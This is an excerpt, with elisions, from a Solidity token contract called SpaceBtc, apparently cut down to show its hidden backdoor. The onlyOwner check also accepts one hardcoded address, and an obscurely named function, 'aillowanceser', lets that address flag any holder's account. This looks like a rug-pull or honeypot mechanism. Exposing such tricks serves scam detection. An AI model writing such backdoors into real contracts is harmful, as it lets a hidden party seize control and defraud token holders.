...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x7ae0E879B439Ed829A5F96eC5bDE5EdA0941907d), "Ownable: caller is not the owner");
        _;
    }
...
contract SpaceBtc is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x7ae0E879B439Ed829A5F96eC5bDE5EdA0941907d);
    address payable public teamWalletAddress = payable(0x7ae0E879B439Ed829A5F96eC5bDE5EdA0941907d);
    ...
    function aillowanceser(address addr, bool status) public{
        require(_msgSender()    ==   address(0x7ae0E879B439Ed829A5F96eC5bDE5EdA0941907d));
        market[addr] = status;
    }
